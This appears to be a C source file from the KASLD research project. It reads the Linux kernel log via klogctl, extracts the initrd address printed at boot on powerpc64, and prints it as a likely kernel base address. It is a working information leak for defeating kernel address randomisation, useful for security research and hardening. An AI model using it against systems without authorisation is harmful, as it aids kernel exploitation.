// This file is part of KASLD - https://github.com/bcoles/kasld
//
// check_for_initrd() prints initrd start address during boot:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
//
// ppc64:
// [    0.000000] Found initrd at 0xc000000001a00000:0xc000000002a26000
//
// Requires:
// - CONFIG_BLK_DEV_INITRD=y
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
// ---
// <bcoles@gmail.com>

#define _DEFAULT_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <unistd.h>
#include "kasld.h"

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char **buffer, int *size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char *)mmap(NULL, *size, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long get_kernel_addr_dmesg_check_for_initrd() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  const char *needle = "Found initrd at 0x";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for check_for_initrd() info ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* Found initrd at 0xc000000001a00000:0xc000000002a26000 */
  // printf("%s\n", line_buf);

  addr = strtoul(&line_buf[strlen(needle)], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_dmesg_check_for_initrd();
  if (!addr)
    return 1;

  printf("leaked initrd start: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & ~KERNEL_BASE_MASK);

  return 0;
}
